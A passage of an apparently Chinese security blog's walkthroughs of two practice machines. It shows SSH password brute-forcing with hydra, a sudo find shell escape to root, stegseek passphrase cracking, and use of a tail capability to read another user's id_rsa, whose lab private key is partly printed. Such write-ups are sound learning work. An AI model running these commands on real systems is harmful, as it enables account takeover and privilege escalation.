<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat note.txt             </span><br><span class="line">Dear pwnlab,</span><br><span class="line"></span><br><span class="line">My <span class="type">name</span> <span class="keyword">is</span> jake. Your <span class="keyword">password</span> <span class="keyword">is</span> very weak <span class="keyword">and</span> easily crackable, I think change your <span class="keyword">password</span>.</span><br></pre></td></tr></table></figure></div>
<p>提示有一个pwnlab用户，并且密码是弱密码</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>扫一下目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># dirsearch -u http://192.168.240.46                </span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/http_192.168.240.46/_25-02-03_13-04-19.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.46</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span>                                  </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span>                                     </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">19</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span></span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">20</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/.php</span>                                             </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">31</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">279</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">32</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">7</span>B  <span class="operator">-</span> <span class="symbol">/test.php</span>                                         </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">42</span>] <span class="number">301</span> <span class="operator">-</span>    <span class="number">0</span>B  <span class="operator">-</span> <span class="operator">/</span>wordpress<span class="symbol">/</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">1.8</span><span class="operator">/</span>wordpress<span class="symbol">/</span>     </span><br><span class="line">[<span class="number">13</span>:<span class="number">04</span>:<span class="number">42</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">2</span>KB <span class="operator">-</span> <span class="operator">/</span>wordpress<span class="operator">/</span>wp-login.php</span><br></pre></td></tr></table></figure></div>
<p>有三个目录<br>test.php中没有有用内容，有登录界面<br>结合刚才的用户名用bp爆破一下 但是这个登录界面提交表单之后就报错<br>用wpscan扫描也没有信息<br>既然刚才说pwnlab用户密码是弱密码，就用hydra爆破一下ssh</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt ssh://192.168.240.46:22 -t 10</span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> <span class="keyword">use</span> <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** <span class="keyword">ignore</span> laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-03</span> <span class="number">13</span>:<span class="number">13</span>:<span class="number">56</span></span><br><span class="line">[WARNING] Many SSH configurations <span class="keyword">limit</span> the <span class="keyword">number</span> of parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> <span class="keyword">reduce</span> the tasks: <span class="keyword">use</span> -t <span class="number">4</span></span><br><span class="line">[WARNING] Restorefile (you have <span class="number">10</span> seconds <span class="keyword">to</span> abort... (<span class="keyword">use</span> <span class="keyword">option</span> -I <span class="keyword">to</span> skip waiting)) <span class="keyword">from</span> a previous session found, <span class="keyword">to</span> prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] <span class="built_in">max</span> <span class="number">10</span> tasks per <span class="number">1</span> server, overall <span class="number">10</span> tasks, <span class="number">14344399</span> login tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">1434440</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.240</span><span class="number">.46</span>:<span class="number">22</span>/</span><br><span class="line">[STATUS] <span class="number">165.00</span> tries/<span class="built_in">min</span>, <span class="number">165</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">14344234</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">1448</span>:<span class="number">55</span>h, <span class="number">10</span> active</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.240</span><span class="number">.46</span>   login: pwnlab   <span class="keyword">password</span>: babygirl1</span><br><span class="line"><span class="number">1</span> of <span class="number">1</span> target successfully completed, <span class="number">1</span> valid <span class="keyword">password</span> found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-03</span> <span class="number">13</span>:<span class="number">15</span>:<span class="number">39</span></span><br></pre></td></tr></table></figure>
<p>成功拿到shell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">pwnlab<span class="variable">@thothtech</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> pwnlab on <span class="symbol">thothtech:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span>\<span class="symbol">:/snap/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> pwnlab may run the following commands on <span class="symbol">thothtech:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /usr/bin/find</span><br></pre></td></tr></table></figure></div>
<p>有find的sudo权限<br>找到find的提权方式</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br></pre></td></tr></table></figure></div>
<p>-quit指令让find找到第一个匹配项之后就立即退出</p>
<p>拿到root权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">pwnlab<span class="variable">@thothtech</span><span class="symbol">:~</span><span class="variable">$ </span>sudo find . -exec /bin/bash \; -quit</span><br><span class="line">root<span class="variable">@thothtech</span><span class="symbol">:/home/pwnlab</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>

<p>非常简单的一个靶机，果然适合新手</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Twisted</title>
    <url>/posts/28211.html</url>
    <content><![CDATA[<p>HMV-Twisted靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679cc6a8d0e0a243d4f8cd2f.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.249  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>1-<span class="number">31</span> <span class="number">19</span>:<span class="number">26</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.249</span></span><br><span class="line">Host is up (<span class="number">0.0018</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>   open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line"><span class="number">2222</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">67</span>:<span class="number">63</span>:a0:c9:<span class="number">8</span>b:<span class="number">7</span>a:f3:<span class="number">42</span>:ac:<span class="number">49</span>:ab:a6:a7:<span class="number">3</span>f:fc:ee (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">8</span>c:ce:<span class="number">87</span>:<span class="number">47</span>:f8:b8:<span class="number">1</span>a:<span class="number">1</span>a:<span class="number">78</span>:e5:b7:ce:<span class="number">74</span>:d7:f5:db (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">92</span>:<span class="number">94</span>:<span class="number">66</span>:<span class="number">0</span>b:<span class="number">92</span>:d3:cf:<span class="number">7</span>e:ff:e8:bf:<span class="number">3</span>c:<span class="number">7</span>b:<span class="number">41</span>:b7:<span class="number">5</span>a (ED25519)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">76</span>:<span class="number">50</span>:<span class="number">9</span>A:<span class="number">7</span>A:<span class="number">10</span>:<span class="number">0</span>F (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.77</span> ms <span class="number">192.168</span>.<span class="number">240.249</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.53</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>就开放了web和ssh<br>我们就去访问一下web有什么信息</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>web界面的内容:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.240.249                            </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>I love cats!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-original.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat original&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>But I prefer this one because seems different<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-hidden.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat Hidden&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure></div>
<p>给了两张图片 图片的样子都一样  提示我们要找到两张照片的不同<br>先用diff比较两张图片</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# diff <span class="keyword">cat</span>-original.jpg <span class="keyword">cat</span>-hidden.jpg </span><br><span class="line">Binary <span class="keyword">files</span> <span class="keyword">cat</span>-original.jpg <span class="built_in">and</span> <span class="keyword">cat</span>-hidden.jpg differ</span><br></pre></td></tr></table></figure></div>
<p>返回是两个图片的二进制文件不同  尝试使用了binwalk分离文件但是没有效果<br>看了wp用了stegseek这个工具  学习起来 <a href="/posts/15173.html" title="kali工具笔记">kali工具笔记</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROLOG"><figure class="iseeu highlight /prolog"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# stegseek -wl /usr/share/wordlists/rockyou.txt cat-original.jpg</span><br><span class="line"><span class="symbol">StegSeek</span> <span class="number">0.6</span> - https://github.com/<span class="symbol">RickdeJager</span>/<span class="symbol">StegSeek</span></span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Found</span> passphrase: <span class="string">&quot;westlife&quot;</span></span><br><span class="line">[i] <span class="symbol">Original</span> filename: <span class="string">&quot;markus.txt&quot;</span>.</span><br><span class="line">[i] <span class="symbol">Extracting</span> to <span class="string">&quot;cat-original.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# stegseek -wl /usr/share/wordlists/rockyou.txt cat-hidden.jpg  </span><br><span class="line"><span class="symbol">StegSeek</span> <span class="number">0.6</span> - https://github.com/<span class="symbol">RickdeJager</span>/<span class="symbol">StegSeek</span></span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Found</span> passphrase: <span class="string">&quot;sexymama&quot;</span></span><br><span class="line">[i] <span class="symbol">Original</span> filename: <span class="string">&quot;mateo.txt&quot;</span>.</span><br><span class="line">[i] <span class="symbol">Extracting</span> to <span class="string">&quot;cat-hidden.jpg.out&quot;</span>.</span><br></pre></td></tr></table></figure></div>
<p>成功分离出文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">ls</span></span><br><span class="line">a.txt  <span class="keyword">cat</span>-hidden.jpg  <span class="keyword">cat</span>-hidden.jpg.<span class="keyword">out</span>  <span class="keyword">cat</span>-original.jpg  <span class="keyword">cat</span>-original.jpg.<span class="keyword">out</span></span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">cat</span> <span class="keyword">cat</span>-hidden.jpg.<span class="keyword">out</span>                                                                            </span><br><span class="line">thisismypassword</span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="keyword">cat</span> <span class="keyword">cat</span>-original.jpg.<span class="keyword">out</span> </span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure></div>
<p>得到一个密码  并且从这个密码可以推断用户名是 markus 登录到ssh中  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh markus@<span class="number">192.168</span>.<span class="number">240.249</span> -p <span class="number">2222</span></span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;[192.168.240.249]:2222 ([192.168.240.249]:2222)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:+Vy+<span class="number">50</span>OqnmO0eOU2nhxE0uNjMjXrtpHTmrYtml4yF3s.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;[192.168.240.249]:2222&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">markus@<span class="number">192.168</span>.<span class="number">240.249</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux twisted <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">118</span>-<span class="number">2</span>+deb10u1 (<span class="number">2020</span>-<span class="number">06</span>-<span class="number">07</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">markus@twisted:~$ </span><br></pre></td></tr></table></figure></div>
<p>成功拿到shell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>这个用户没有sudo命令权限  也没有可以利用的suid<br>这个用户下有一个note.txt</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:~</span><span class="variable">$ </span>cat note.txt </span><br><span class="line"><span class="title class_">Hi</span> bonita,</span><br><span class="line">I have saved your id_rsa <span class="symbol">here:</span> /var/cache/apt/id_rsa</span><br><span class="line"><span class="title class_">Nobody</span> can find it. </span><br></pre></td></tr></table></figure></div>
<p>提示有一个用户叫做bonita 利用id_rsa文件登录到这个用户<br>现在没有权限读取这个文件<br>但是home目录下面找到两个其他用户的文件夹 </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:/home</span><span class="variable">$ </span>ls</span><br><span class="line">bonita  markus  mateo</span><br><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:/home</span><span class="variable">$ </span>cd bonita/</span><br><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:/home/bonita</span><span class="variable">$ </span>ls</span><br><span class="line">beroot  user.txt</span><br></pre></td></tr></table></figure></div>
<p>但是都没有权限 所以现在必须要找到利用id_rsa的办法<br>没有思路 看wp， 大佬用了getcap这个命令查看文件的权利  记录记录<a href="/posts/49809.html" title="linux指令笔记">linux指令笔记</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">markus<span class="variable">@twisted</span>:~<span class="variable">$ </span>getcap / -r <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">markus<span class="variable">@twisted</span>:~<span class="variable">$ </span>/usr/sbin/getcap / -r <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/ping = cap_net_raw+ep</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/tail</span> = cap_dac_read_search+ep</span><br></pre></td></tr></table></figure></div>
<p>发现tail指令可以绕过文件的读和搜索权限  所以用tail指令获取id_rsa内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">markus@twisted:~$ tail <span class="operator">-</span>n <span class="number">50</span> <span class="symbol">/var/cache/apt/id_rsa</span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa<span class="operator">+</span>xshyrmk6zd</span><br><span class="line">FyguFUO7tN2TCJGTomDTXrG<span class="symbol">/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS</span></span><br><span class="line">olvmldJg2habNOUGA4EBKlTwfDi<span class="operator">+</span>vjDP8d77mF<span class="operator">+</span>rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1</span><br><span class="line">vD5282SncYtJb<span class="symbol">/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF</span></span><br><span class="line">gFnch7ptoxAqe0M0UIEzP<span class="operator">+</span>G2ull3m80G5L7Q<span class="symbol">/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C</span></span><br><span class="line">tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM</span><br><span class="line">gl9<span class="operator">+</span>zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC</span><br><span class="line">xCQFX9U2tULUiiP8XHeFRpIILg8FKiW<span class="operator">+</span>aV0mDaFps05QYDgQEqVPB8OL6<span class="operator">+</span>MM<span class="symbol">/x3vuYX6u8</span></span><br><span class="line">DcTBHe<span class="operator">+</span>PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H</span><br><span class="line">uN7M51f7<span class="operator">+</span>eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM<span class="symbol">/4ba6WXebzQbkvtD/dpyD</span></span><br><span class="line">XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu</span><br><span class="line">U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa<span 